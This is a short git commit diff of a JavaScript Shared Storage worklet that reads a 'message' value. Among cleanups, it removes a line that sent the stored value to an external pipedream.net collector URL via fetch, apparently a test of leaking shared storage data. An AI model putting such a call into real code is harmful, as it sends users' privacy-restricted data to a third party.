01ef9ff3f2518b7b5490a640399cc4d84256fca7
Luca Padalino <lucapada@users.noreply.github.com>
2025-03-30 12:31:57 +0200

    Update custom-worklet.js

--- custom-worklet.js
+++ custom-worklet.js
@@ -1,12 +1,8 @@
 class MessageReader {
-  async run(data) {
-    // Read the "message" value from the shared storage
+  async run() {
     const message = await sharedStorage.get("message");
-    fetch('https://eo6fy418ngjzt55.m.pipedream.net/' + message)
-    // Return the message value
     return message;
   }
 }
 
-// Register the worklet operation
 register("read-message", MessageReader);
